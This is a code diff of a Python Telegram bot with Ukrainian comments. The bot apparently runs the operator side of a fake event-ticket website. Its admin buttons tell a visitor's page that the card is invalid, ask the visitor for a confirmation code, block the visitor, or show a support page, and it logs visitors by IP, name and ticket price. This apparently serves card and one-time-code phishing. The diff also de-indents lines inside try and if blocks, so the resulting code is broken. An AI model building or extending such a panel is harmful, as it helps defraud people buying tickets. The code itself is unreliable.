@@ -388,14 +388,14 @@ def get_event_info_by_page_code(page_code):
     
     # Якщо не знайдено, шукаємо в site_users (для зворотної сумісності)
     try:
-        c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
-        row = c.fetchone()
-        if row:
-            return {
-                'price': row[0],
-                'currency': row[1],
-                'street': row[2]
-            }
+    c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
+    row = c.fetchone()
+    if row:
+        return {
+            'price': row[0],
+            'currency': row[1],
+            'street': row[2]
+        }
     except Exception as e:
         print(f"[get_event_info_by_page_code] Error in site_users: {e}")
     
@@ -406,10 +406,10 @@ def get_admin_username_by_user_id(user_id):
     c = conn.cursor()
     try:
         # Спочатку шукаємо в таблиці users
-        c.execute('SELECT username FROM users WHERE user_id=?', (user_id,))
-        row = c.fetchone()
-        if row and row[0]:
-            return row[0]
+    c.execute('SELECT username FROM users WHERE user_id=?', (user_id,))
+    row = c.fetchone()
+    if row and row[0]:
+        return row[0]
         
         # Якщо не знайдено, шукаємо в таблиці event_links
         c.execute('SELECT user_id FROM event_links WHERE user_id=?', (user_id,))
@@ -2004,7 +2004,7 @@ async def ticket_input_handler(message: types.Message):
         
         # Білий прямокутник всередині сірого (менший по ширині та довжині, як на другому скріншоті)
         c.setFillColorRGB(1, 1, 1)  # Білий колір
-        c.rect(80, 150, width - 160, height - 100, fill=1)  # Відступ зверху 150px, знизу 0px
+        c.rect(80, 250, width - 160, height - 100, fill=1)  # Відступ зверху 250px, знизу 0px
         
         # Верхний домен по центру, серым (опускаємо нижче для рамки)
         top_y = height - 60
@@ -2467,9 +2467,9 @@ async def admin_enter_text(message: types.Message):
         c = conn.cursor()
         try:
             c.execute('SELECT name FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
-            row = c.fetchone()
-            if row:
-                user_name = row[0]
+        row = c.fetchone()
+        if row:
+            user_name = row[0]
         except sqlite3.OperationalError:
             # Якщо колонки name немає, використовуємо IP як ім'я
             user_name = f"User_{ip.split('.')[-1]}"
@@ -3020,9 +3020,9 @@ async def code_notify(request):
         c = conn.cursor()
         try:
             c.execute('SELECT name FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
-            row = c.fetchone()
-            if row:
-                user_name = row[0]
+        row = c.fetchone()
+        if row:
+            user_name = row[0]
         except sqlite3.OperationalError:
             # Якщо колонки name немає, використовуємо IP як ім'я
             user_name = f"User_{ip.split('.')[-1]}"
@@ -3113,17 +3113,17 @@ async def admin_action_handler(call: types.CallbackQuery):
     print(f"[DEBUG] Callback data type: {type(call.data)}")
     
     try:
-        parts = call.data.split(':')
+    parts = call.data.split(':')
         print(f"[DEBUG] Parts after split: {parts}")
-        action = parts[0]
+    action = parts[0]
         
         # Спеціальна обробка для code_request_again
         if action == 'code_request_again':
             page_code = parts[1] if len(parts) > 1 else None
             ip = None  # Для code_request_again IP не потрібен
         else:
-            ip = parts[1] if len(parts) > 1 else None
-            page_code = parts[2] if len(parts) > 2 else None
+    ip = parts[1] if len(parts) > 1 else None
+    page_code = parts[2] if len(parts) > 2 else None
         
         print(f"[DEBUG] Parsed: action={action}, ip={ip}, page_code={page_code}")
     except Exception as e:
@@ -3145,9 +3145,9 @@ async def admin_action_handler(call: types.CallbackQuery):
         c = conn.cursor()
         try:
             c.execute('SELECT name FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
-            row = c.fetchone()
-            if row:
-                user_name = row[0]
+        row = c.fetchone()
+        if row:
+            user_name = row[0]
         except sqlite3.OperationalError:
             # Якщо колонки name немає, використовуємо IP як ім'я
             user_name = f"User_{ip.split('.')[-1]}"
@@ -3226,15 +3226,15 @@ async def admin_action_handler(call: types.CallbackQuery):
             try:
                 resp = await session.post('http://127.0.0.1:8080/admin_action', json={'action': action, 'ip': ip})
                 print(f'[DEBUG] {action.upper()} response: {resp.status}')
-
+        
                 if resp.status == 200:
-                    if action == 'card':
+        if action == 'card':
                         await call.answer("✅ Сигнал про невірну карту надіслано на сайт")
-                    elif action == 'block':
+        elif action == 'block':
                         await call.answer("✅ Користувач заблокований на сайті")
-                    elif action == 'unblock':
+        elif action == 'unblock':
                         await call.answer("✅ Користувач розблокований на сайті")
-                    elif action == 'code':
+        elif action == 'code':
                         await call.answer("✅ Код запитується на сайті")
                 else:
                     await call.answer("❌ Помилка виконання дії")
@@ -3243,8 +3243,8 @@ async def admin_action_handler(call: types.CallbackQuery):
                 print(f'[ERROR] {action.upper()} request failed: {e}')
                 await call.answer("❌ Помилка сервера")
         
-                print(f'[DEBUG] {action.upper()} action completed')
-                return
+        print(f'[DEBUG] {action.upper()} action completed')
+        return
     elif action == 'support':
         print(f'[DEBUG] Processing SUPPORT action for ip={ip}, page_code={page_code}')
         if not ip:
@@ -3258,26 +3258,26 @@ async def admin_action_handler(call: types.CallbackQuery):
                 print(f'[DEBUG] Support response: {resp.status}')
         
                 if resp.status == 200:
-                    # Надсилаємо красиве повідомлення про технічну підтримку
-                    if ip and page_code:  # Додаємо перевірку page_code
-                        admin_user_id = None
-                        c = conn.cursor()
-                        c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
-                        row = c.fetchone()
-                        if row:
-                            admin_user_id = row[0]
-                        
-                        if admin_user_id:
-                            admin_username = get_admin_username_by_user_id(admin_user_id)
-                            support_message = format_support_notification_message(
-                                admin_username=admin_username,
-                                name=user_name,
-                                price=event_price,
-                                currency=event_currency
-                            )
-                            await bot.send_message(admin_user_id, support_message)
-                            print(f'[DEBUG] Support message sent to admin {admin_user_id}')
-                        
+        # Надсилаємо красиве повідомлення про технічну підтримку
+        if ip and page_code:  # Додаємо перевірку page_code
+            admin_user_id = None
+            c = conn.cursor()
+            c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+            row = c.fetchone()
+            if row:
+                admin_user_id = row[0]
+            
+            if admin_user_id:
+                admin_username = get_admin_username_by_user_id(admin_user_id)
+                support_message = format_support_notification_message(
+                    admin_username=admin_username,
+                    name=user_name,
+                    price=event_price,
+                    currency=event_currency
+                )
+                await bot.send_message(admin_user_id, support_message)
+                print(f'[DEBUG] Support message sent to admin {admin_user_id}')
+        
                         await call.answer("✅ Сторінка техпідтримки завантажена на сайті")
                     else:
                         await call.answer("❌ Помилка завантаження сторінки техпідтримки")
